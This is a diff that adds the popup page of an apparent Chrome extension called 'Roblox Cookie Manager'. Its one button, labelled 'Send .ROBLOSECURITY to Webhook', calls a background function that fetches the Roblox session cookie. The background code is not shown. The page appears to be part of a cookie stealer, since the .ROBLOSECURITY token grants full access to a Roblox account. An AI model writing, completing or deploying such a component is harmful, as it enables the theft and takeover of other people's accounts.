@@ -1,0 +1,19 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Roblox Cookie Manager</title>
+</head>
+<body>
+    <h1>Roblox Cookie Manager</h1>
+    <button id="sendCookieButton">Send .ROBLOSECURITY to Webhook</button>
+
+    <script>
+        document.getElementById("sendCookieButton").addEventListener("click", function() {
+            chrome.runtime.getBackgroundPage(function(background) {
+                background.getRobloxSecurityCookie();
+            });
+        });
+    </script>
+</body>
+</html> 
